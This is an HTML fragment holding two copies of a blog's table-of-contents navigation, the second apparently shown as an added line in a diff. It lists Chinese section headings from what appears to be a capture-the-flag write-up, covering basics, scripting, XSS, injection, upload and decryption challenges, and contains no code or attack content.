class="post-toc-text">逗比的验证码第三期（SESSION）</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#微笑一下就能过关了"><span class="post-toc-number">2.8.</span> <span class="post-toc-text">微笑一下就能过关了</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#逗比的手机验证码"><span class="post-toc-number">2.9.</span> <span class="post-toc-text">逗比的手机验证码</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#基情燃烧的岁月"><span class="post-toc-number">2.10.</span> <span class="post-toc-text">基情燃烧的岁月</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#验证码识别"><span class="post-toc-number">2.11.</span> <span class="post-toc-text">验证码识别</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#XSS基础关"><span class="post-toc-number">2.12.</span> <span class="post-toc-text">XSS基础关</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#XSS基础2-简单绕过"><span class="post-toc-number">2.13.</span> <span class="post-toc-text">XSS基础2:简单绕过</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#XSS基础3-检测与构造"><span class="post-toc-number">2.14.</span> <span class="post-toc-text">XSS基础3:检测与构造</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Principle很重要的XSS"><span class="post-toc-number">2.15.</span> <span class="post-toc-text">Principle很重要的XSS</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#注入关"><span class="post-toc-number">3.</span> <span class="post-toc-text">注入关</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#上传关"><span class="post-toc-number">4.</span> <span class="post-toc-text">上传关</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#请上传一张jpg格式的图片1"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">请上传一张jpg格式的图片1</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#请上传一张jpg格式的图片2"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">请上传一张jpg格式的图片2</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#请上传一张jpg格式的图片3"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">请上传一张jpg格式的图片3</span></a></li></ol></li></ol>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#基础关"><span class="post-toc-number">1.</span> <span class="post-toc-text">基础关</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#key在哪里"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">key在哪里?</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#再加密一次你就得到key啦"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">再加密一次你就得到key啦~</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#猜猜这是经过了多少次加密？"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">猜猜这是经过了多少次加密？</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#据说MD5加密很安全，真的是么？"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">据说MD5加密很安全，真的是么？</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#种族歧视"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">种族歧视</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#HAHA浏览器"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">HAHA浏览器</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#key究竟在哪里呢？"><span class="post-toc-number">1.7.</span> <span class="post-toc-text">key究竟在哪里呢？</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#key又找不到了"><span class="post-toc-number">1.8.</span> <span class="post-toc-text">key又找不到了</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#冒充登陆用户"><span class="post-toc-number">1.9.</span> <span class="post-toc-text">冒充登陆用户</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#比较数字大小"><span class="post-toc-number">1.10.</span> <span class="post-toc-text">比较数字大小</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#本地的诱惑"><span class="post-toc-number">1.11.</span> <span class="post-toc-text">本地的诱惑</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#就不让你访问"><span class="post-toc-number">1.12.</span> <span class="post-toc-text">就不让你访问</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#脚本关"><span class="post-toc-number">2.</span> <span class="post-toc-text">脚本关</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#key又又找不到了"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">key又又找不到了</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#快速口算"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">快速口算</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#这个题目是空的"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">这个题目是空的</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#怎么就是不弹出key呢？"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">怎么就是不弹出key呢？</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#逗比验证码第一期"><span class="post-toc-number">2.5.</span> <span class="post-toc-text">逗比验证码第一期</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#逗比验证码第二期"><span class="post-toc-number">2.6.</span> <span class="post-toc-text">逗比验证码第二期</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#逗比的验证码第三期（SESSION）"><span class="post-toc-number">2.7.</span> <span class="post-toc-text">逗比的验证码第三期（SESSION）</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#微笑一下就能过关了"><span class="post-toc-number">2.8.</span> <span class="post-toc-text">微笑一下就能过关了</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#逗比的手机验证码"><span class="post-toc-number">2.9.</span> <span class="post-toc-text">逗比的手机验证码</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#基情燃烧的岁月"><span class="post-toc-number">2.10.</span> <span class="post-toc-text">基情燃烧的岁月</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#验证码识别"><span class="post-toc-number">2.11.</span> <span class="post-toc-text">验证码识别</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#XSS基础关"><span class="post-toc-number">2.12.</span> <span class="post-toc-text">XSS基础关</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#XSS基础2-简单绕过"><span class="post-toc-number">2.13.</span> <span class="post-toc-text">XSS基础2:简单绕过</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#XSS基础3-检测与构造"><span class="post-toc-number">2.14.</span> <span class="post-toc-text">XSS基础3:检测与构造</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Principle很重要的XSS"><span class="post-toc-number">2.15.</span> <span class="post-toc-text">Principle很重要的XSS</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#注入关"><span class="post-toc-number">3.</span> <span class="post-toc-text">注入关</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#上传关"><span class="post-toc-number">4.</span> <span class="post-toc-text">上传关</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#请上传一张jpg格式的图片1"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">请上传一张jpg格式的图片1</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#请上传一张jpg格式的图片2"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">请上传一张jpg格式的图片2</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#请上传一张jpg格式的图片3"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">请上传一张jpg格式的图片3</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#解密关"><span class="post-toc-number">5.</span> <span class="post-toc-text">解密关</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#以管理员身份登录系统"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">以管理员身份登录系统</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#邂逅对门的妹纸"><span class="post-toc-number">5.2.</span> <span class="post-toc-text">邂逅对门的妹纸</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#万恶的Cisco"><span class="post-toc-number">5.3.</span> <span class="post-toc-text">万恶的Cisco</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#万恶的加密"><span class="post-toc-number">5.4.</span> <span class="post-toc-text">万恶的加密</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#喜欢泡网吧的小明"><span class="post-toc-number">5.5.</span> <span class="post-toc-text">喜欢泡网吧的小明</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#异常数据"><span class="post-toc-number">5.6.</span> <span class="post-toc-text">异常数据</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#md5真的能碰撞嘛"><span class="post-toc-number">5.7.</span> <span class="post-toc-text">md5真的能碰撞嘛?</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#小明爱上了一个搞硬件的小姑凉"><span class="post-toc-number">5.8.</span> <span class="post-toc-text">小明爱上了一个搞硬件的小姑凉</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#有签名限制的读取任意文件"><span class="post-toc-number">5.9.</span> <span class="post-toc-text">有签名限制的读取任意文件</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#美丽的邂逅与密码器的开门密码"><span class="post-toc-number">5.10.</span> <span class="post-toc-text">美丽的邂逅与密码器的开门密码</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#综合关"><span class="post-toc-number">5.11.</span> <span class="post-toc-text">综合关</span></a></li></ol></li></ol>
             </nav>
             <div class="toc-bar"><div>
         </aside>
